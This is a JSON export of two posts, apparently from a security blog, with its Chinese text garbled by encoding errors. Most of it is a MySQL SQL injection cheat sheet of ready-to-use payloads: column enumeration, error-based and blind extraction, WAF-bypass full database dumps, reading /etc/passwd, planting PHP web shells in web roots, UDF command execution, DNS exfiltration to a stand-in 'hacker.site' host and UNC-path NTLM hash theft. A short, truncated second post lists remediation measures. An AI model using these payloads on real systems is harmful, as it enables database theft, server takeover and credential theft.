{"posts":[{"title":"SQL æ³¨å…¥ - Mysql","content":"0x0 Mysql åŸºç¡€è¯­å¥ æ³¨é‡Š # MYSQL æ³¨é‡Š -- æ³¨é‡Š [ä¸¤ä¸ª - åé¢åŠ ä¸€ä¸ªç©ºæ ¼] /* MYSQL æ³¨é‡Š */ /*!32302 10*/ MYSQL 3.23.02 ç‰ˆæœ¬çš„æ³¨é‡Š /*! MYSQL ç‰¹æ®Š SQL */ æŸ¥è¯¢è¯­å¥ $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; $sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; $sql=&quot;SELECT * FROM users WHERE id=('$id') LIMIT 0,1&quot;; $sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username='$username' and users.password='$password' ORDER BY users.id DESC LIMIT 0,1&quot;; $sql = &quot;SELECT * FROM users ORDER BY $id&quot;; æ’å…¥è¯­å¥ $sql = &quot;insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;)&quot;; æ›´æ–°è¯­å¥ $sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;; åˆ é™¤è¯­å¥ $sql = &quot;delete from student where id = $id&quot; $sql = &quot;delete from student where id in ($id1, $id2, $id3)&quot; 0x1 åŸºäº Union çš„è”åˆæ³¨å…¥ ä¸€èˆ¬ç”¨äºæŸ¥è¯¢è¯­å¥çš„æ³¨å…¥ æ£€æŸ¥åˆ—æ•° è”åˆæ³¨å…¥éœ€è¦çŸ¥é“æŸ¥è¯¢è¯­å¥æ˜¾ç¤ºçš„åˆ—æ•°ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•å»åˆ¤æ–­ order by 1' ORDER BY 1--+ #True 1' ORDER BY 2--+ #True 1' ORDER BY 3--+ #True 1' ORDER BY 4--+ #False - å¯ä»¥åˆ¤æ–­ï¼Œè¢«æ³¨å…¥è¯­å¥æŸ¥è¯¢ç»“æœæœ‰ä¸‰åˆ— -1' UNION SELECT 1,2,3--+ # True group by 1' GROUP BY 1--+ #True 1' GROUP BY 2--+ #True 1' GROUP BY 3--+ #True 1' GROUP BY 4--+ #False - å¯ä»¥åˆ¤æ–­ï¼Œè¢«æ³¨å…¥è¯­å¥æŸ¥è¯¢ç»“æœæœ‰ä¸‰åˆ— -1' UNION SELECT 1,2,3--+ # True å¦‚æœç›®æ ‡å¯ç”¨äº†é”™è¯¯æ˜¾ç¤º å¦‚æœé¡µé¢è¿”å›é”™è¯¯ä¿¡æ¯ï¼Œå¯ä»¥æ„é€ è¯­å¥è®©å…¶æ˜¾ç¤ºè¯­æ³•é”™è¯¯ï¼Œä¸€èˆ¬ä¼šæ˜¾ç¤ºéœ€è¦çš„ä¿¡æ¯ order by æŠ¥é”™ 1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # å¦‚æœæç¤ºï¼šUnknown column '4' in 'order clause' # è¯´æ˜ç¬¬ 4 åˆ—ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå¾—çŸ¥åªæœ‰ä¸‰åˆ—ã€‚ # -1' UNION SELECT 1,2,3--+ # True group by æŠ¥é”™ 1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # å¦‚æœæç¤ºï¼šUnknown column '4' in 'group statement' # è¯´æ˜ç¬¬ 4 åˆ—ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå¾—çŸ¥åªæœ‰ä¸‰åˆ—ã€‚ # -1' UNION SELECT 1,2,3--+ # True union select æŠ¥é”™ 1' UNION SELECT @--+ # æŠ¥é”™: The used SELECT statements have a different number of columns 1' UNION SELECT @,@--+ # æŠ¥é”™: The used SELECT statements have a different number of columns 1' UNION SELECT @,@,@--+ # æ— æŠ¥é”™ï¼Œè¯´æ˜æœ‰ 3 åˆ— -1' UNION SELECT 1,2,3--+ # True limit into 1' LIMIT 1,1 INTO @--+ # æŠ¥é”™: The used SELECT statements have a different number of columns 1' LIMIT 1,1 INTO @,@--+ # æŠ¥é”™: The used SELECT statements have a different number of columns 1' LIMIT 1,1 INTO @,@,@--+ # æ— æŠ¥é”™ï¼Œè¯´æ˜æœ‰ 3 åˆ— -1' UNION SELECT 1,2,3--+ # True select * from any_table 1' AND (SELECT * FROM Users) = 1--+ # (select * from users) ä¼šè¿”å› users è¡¨çš„åˆ—æ•°ï¼Œé€šè¿‡é€»è¾‘åˆ¤æ–­ # å¦‚æœé”™è¯¯ä¿¡æ¯ä¸­åŒ…å«ï¼šmeans query uses 3 column -1' UNION SELECT 1,2,3--+ # True è·å–æ•°æ® æœ‰ information_schema ä¹Ÿå¯ä»¥ union all selectï¼Œ# åŠ ä¸Š all å¯ä»¥æ˜¾ç¤ºæ‰€æœ‰ç»“æœï¼ŒåŒ…æ‹¬é‡å¤è¡Œã€‚ # æ•°æ®åº“ UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata # è¡¨ UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=... # å­—æ®µ UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=... # æ•°æ® UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+... æ—  information_schema ç‰ˆæœ¬: Mysql &gt;= 4.1 # é¦–å…ˆè·å–å­—æ®µæ•° ?id=(1)and(SELECT * from db.users)=(1) -- æŠ¥é”™ï¼šOperand should contain 4 column(s) # ç„¶åæå–å­—æ®µ ?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1) -- æŠ¥é”™ï¼šColumn 'id' cannot be null ç‰ˆæœ¬ Mysql = 5 # è·å–å­—æ®µå -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a -- #1060 - Duplicate column name 'id' -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a -- #1060 - Duplicate column name 'name' -1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a ... æ— å­—æ®µåæå–æ•°æ® è·å–ç¬¬ 4 åˆ—æ•°æ® select `4` from (select 1,2,3,4,5,6 union select * from users)dbname; æŸ¥è¯¢å†…æ³¨å…¥ select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1); åŸºäºé”™è¯¯å›æ˜¾çš„æŠ¥é”™æ³¨å…¥ æŠ¥é”™ä¿¡æ¯é•¿åº¦æœ‰é™ åŸºæœ¬çš„æŠ¥é”™ ç‰ˆæœ¬: Mysql &gt;= 4.1 (select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)) '+(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+' UpdateXML å‡½æ•°æŠ¥é”™ AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)-- AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)-- çŸ­ä¸€ç‚¹çš„ Payload ' and updatexml(null,concat(0x0a,version()),null)-- - ' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- - Extractvalue å‡½æ•°æŠ¥é”™ ç‰ˆæœ¬: Mysql &gt;= 5.1 ?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))-- ?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))-- NAME_CONST å‡½æ•°æŠ¥é”™ æŸ¥è¯¢è¯­å¥çš„å†…å®¹å¿…é¡»æ˜¯å¸¸é‡ï¼Œä¹Ÿå°±æ˜¯ç¡®å®šçš„å€¼ï¼Œæ— æ³•ä½¿ç”¨é€šè¿‡ SQL è¯­å¥å¾—åˆ°çš„å€¼ ç‰ˆæœ¬ Mysql &gt;= 5.0 ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)-- ?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)-- Mysql å¸ƒå°”ç›²æ³¨ é€šè¿‡è§‚å¯Ÿé¡µé¢æ˜¯å¦å‘ç”Ÿå˜åŒ–æ¥åˆ¤æ–­ é€šè¿‡å­—ç¬¦ä¸²æ¯”è¾ƒ ?id=1 and substring(version(),1,1)=5 ?id=1 and right(left(version(),1),1)=5 ?id=1 and left(version(),1)=4 ?id=1 and ascii(lower(substr(Version(),1,1)))=51 ?id=1 and (select mid(version(),1,1)=4) ?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; 'A' ?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; 'A' order by &amp; æ­£åˆ™è¡¨è¾¾å¼ &amp; then [...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP &quot;^[BRUTEFORCE CHAR BY CHAR].*&quot; AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- - then &amp; æ­£åˆ™è¡¨è¾¾å¼ ' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP &quot;^a.*&quot;) THEN SLEEP(3) ELSE 1 END)); -- - # SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP &quot;^a.*&quot;) THEN SLEEP(3) ELSE 1 END)); -- -'; if æ¡ä»¶ç›²æ³¨ 2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2 Response: # HTTP/1.1 500 Internal Server Error 2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2 Response: HTTP/1.1 200 OK make_set ç›²æ³¨ AND MAKE_SET(YOLO&lt;(SELECT(length(version()))),1) AND MAKE_SET(YOLO&lt;ascii(substring(version(),POS,1)),1) AND MAKE_SET(YOLO&lt;(SELECT(length(concat(login,password)))),1) AND MAKE_SET(YOLO&lt;ascii(substring(concat(login,password),POS,1)),1) Like ç›²æ³¨, '_' åŒ¹é… SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l'; Mysql æ—¶é—´ç›²æ³¨ åœ¨å­æŸ¥è¯¢ä¸­ sleep 1 and (select sleep(10) from dual where database() like '%')# 1 and (select sleep(10) from dual where database() like '___')# 1 and (select sleep(10) from dual where database() like '____')# 1 and (select sleep(10) from dual where database() like '_____')# 1 and (select sleep(10) from dual where database() like 'a____')# ... 1 and (select sleep(10) from dual where database() like 's____')# 1 and (select sleep(10) from dual where database() like 'sa___')# ... 1 and (select sleep(10) from dual where database() like 'sw___')# 1 and (select sleep(10) from dual where database() like 'swa__')# 1 and (select sleep(10) from dual where database() like 'swb__')# 1 and (select sleep(10) from dual where database() like 'swi__')# ... 1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')# ä½¿ç”¨æ¡ä»¶è¯­å¥ ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))&gt;=100,1, BENCHMARK(2000000,MD5(NOW()))) -- ?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))&gt;=100, 1, SLEEP(3)) -- ?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2 Mysql ä¸€æ¬¡æ€§è½¬å‚¨ (disposable dump) (select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] &gt; ',table_name,' &gt; ',column_name,0x7C))))a)# (select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] &gt; ',column_data2,' &gt; ',0x7C))))a)# -- SecurityIdiots make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@) -- Profexer (select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a) -- Dr.Z3r0 (select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)) -- M@dBl00d (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)) -- Zen +make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@) -- Zen WAF (/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a) -- ~tr0jAn WAF +concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+ -- ~tr0jAn Benchmark +concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name&gt;@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name&gt;@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name&gt;@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+ -- N1Z4M WAF +/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+ -- sharik (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a) Mysql æŸ¥çœ‹å½“å‰æŸ¥è¯¢ union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST # -- Dump in one shot example for the table content. union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 # Mysql è¯»å–æ–‡ä»¶å†…å®¹ éœ€è¦ file-privï¼Œå¦åˆ™ä¼šæœ‰æŠ¥é”™: ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement ' UNION ALL SELECT LOAD_FILE('/etc/passwd') -- UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php')); å¦‚æœå·²è¿æ¥æ•°æ®åº“ï¼Œå¯ä»¥é‡æ–°å¯ç”¨LOAD_FILE GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;# Mysql GetShell è¾“å‡º Shell åˆ°æ–‡ä»¶ [...] UNION SELECT &quot;&lt;?php system($_GET['cmd']); ?&gt;&quot; into outfile &quot;C:\\\\xampp\\\\htdocs\\\\backdoor.php&quot; [...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '&lt;?php phpinfo();?&gt;' [...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- - [...] union all select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET['cmd']);?&gt;&quot;,6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php' Dump Shell åˆ°æ–‡ä»¶ [...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php' [...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php'; Mysql æˆªæ–­ ä¸»è¦ä¸ sql-mode çš„å€¼æœ‰å…³ é»˜è®¤(éä¸¥æ ¼æ¨¡å¼)ï¼šdefaultï¼Œ éä¸¥æ ¼æ¨¡å¼ï¼š&quot;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&quot; ä¸¥æ ¼æ¨¡å¼ï¼šï¼š&quot;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES&quot; åœ¨éä¸¥æ ¼æ¨¡å¼ä¸‹ï¼Œå¦‚æœæ’å…¥æ•°æ®è¶…è¿‡å·²è®¾ç½®é•¿åº¦ï¼Œåˆ™ä¼šè­¦å‘Šè€Œä¸æ˜¯æŠ¥é”™ã€‚ select @@sql_mode # æŸ¥çœ‹æ•°æ®åº“æ¨¡å¼ `username` varchar(20) not null åˆ©ç”¨ï¼šusername = &quot;admin a&quot; åŠ å…¥ç©ºæ ¼å¡«å……é•¿åº¦ï¼Œä½¿æœ€åä¸€ä¸ªaè¢«æˆªæ–­ï¼Œåˆ™æˆåŠŸæ’å…¥adminç”¨æˆ· Mysql å¿«é€Ÿåˆ©ç”¨ ä½¿ç”¨ json_arrayagg ä»£æ›¿ group_concatï¼Œjson_arrayagg å¯ä»¥å…è®¸è¶…è¿‡16000000ä¸ªç¬¦å·ï¼Œgroup_concat ä»…å…è®¸1024 ä¸ªç¬¦å· ç‰ˆæœ¬ Mysql &gt;= 5.7.22 SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES; Use instead of which allows less symbols to be displayed * group_concat() = 1024 symbols * json_arrayagg() &gt; 16,000,000 symbolsjson_arrayagg()group_concat() UDF å‘½ä»¤æ‰§è¡Œ &amp; ææƒ é¦–å…ˆæŸ¥çœ‹æ˜¯å¦å®‰è£… UDF $ whereis lib_mysqludf_sys.so $ mysql -u root -p mysql Enter password: [...] mysql&gt; SELECT sys_eval('id'); +--------------------------------------------------+ | sys_eval('id') | +--------------------------------------------------+ | uid=118(mysql) gid=128(mysql) groups=128(mysql) | +--------------------------------------------------+ Mysql æ¶ˆæ¯å¤–å¸¦ ç”¨äºæ— å›æ˜¾çš„ç¯å¢ƒä¸­ select @@version into outfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt'; select @@version into dumpfile '\\\\\\\\192.168.0.100\\\\temp\\\\out.txt DNS å¤–å¸¦ select load_file(concat('\\\\\\\\',version(),'.hacker.site\\\\a.txt')); select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)) UNC è·¯å¾„ - NTLM Hash çªƒå– select load_file('\\\\\\\\error\\\\abc'); select load_file(0x5c5c5c5c6572726f725c5c616263); select 'osanda' into dumpfile '\\\\\\\\error\\\\abc'; select 'osanda' into outfile '\\\\\\\\error\\\\abc'; load data infile '\\\\\\\\error\\\\abc' into table database.table_name; ","link":"https://Zer0-hex.github.io/n3qKmqqFF/"},{"title":"SQL æ³¨å…¥ä¿®å¤æªæ–½","content":" ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ï¼šå°†è¾“å…¥å€¼è§†ä¸ºå‚æ•°ï¼Œè€Œä¸æ˜¯æ‹¼æ¥åˆ°SQLæŸ¥è¯¢ä¸­ï¼Œå¯ä»¥æœ‰æ•ˆåœ°é˜²æ­¢SQLæ³¨å…¥æ”»å‡»ã€‚ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢å¯ä»¥é€šè¿‡ä½¿ç”¨é¢„å®šä¹‰çš„å‚æ•°æ¥å‘æŸ¥è¯¢æ·»åŠ å˜é‡ï¼Œè¿™äº›å˜é‡ä¼šè¢«æ­£ç¡®åœ°ç¼–ç ï¼Œä»è€Œé¿å…äº†æ¶æ„è¾“å…¥æ³¨å…¥çš„é—®é¢˜ã€‚ å¯¹è¾“å…¥è¿›è¡Œæœ‰æ•ˆçš„éªŒè¯å’Œè¿‡æ»¤ï¼šé€šè¿‡å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡ŒéªŒè¯å’Œè¿‡æ»¤ï¼Œå¯ä»¥ç¡®ä¿è¾“å…¥ç¬¦åˆé¢„æœŸçš„æ ¼å¼å’Œç±»å‹ï¼Œå¹¶ä¸”ä¸åŒ…å«æ¶æ„çš„ä»£ç ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æŸ¥è¾“å…¥çš„æ ¼å¼ï¼Œæˆ–è€…ä½¿ç”¨ç™½åå•æœºåˆ¶æ¥å…è®¸æŸäº›ç±»å‹çš„è¾“å…¥ã€‚ æœ€å°åŒ–è¾“å…¥çš„ç‰¹æƒï¼šé™ä½ç”¨æˆ·è¾“å…¥çš„æƒé™å¯ä»¥å¸®åŠ©å‡å°‘æ”»å‡»çš„å½±å“ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥å°†ç”¨æˆ·è¾“å…¥é™åˆ¶ä¸ºæŸäº›ç‰¹å®šçš„å­—ç¬¦æˆ–é•¿åº¦èŒƒå›´ï¼Œæˆ–è€…åªå…è®¸è®¿é—®å—é™åˆ¶çš„æ•°æ®åº“å¯¹è±¡ã€‚ ä½¿ç”¨ORMæ¡†æ¶ï¼šORMæ¡†æ¶å°†å¯¹è±¡æ˜ 